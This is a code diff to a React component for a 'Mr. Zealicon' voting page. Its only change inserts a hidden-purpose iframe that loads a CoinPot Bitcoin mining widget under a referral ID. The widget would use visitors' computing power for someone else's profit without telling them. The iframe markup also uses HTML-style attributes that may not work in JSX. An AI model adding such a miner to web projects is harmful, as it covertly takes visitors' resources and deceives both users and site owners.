@@ -53,6 +53,7 @@ class male extends React.Component {
     return (
       <div className='container'>
         <h3 className='text-center'>Who do you think should be Mr. Zealicon this year?</h3>
+      <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoin/?ref=E368E707D93D&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
         <div className='row'>
           {characterNodes}
         </div>
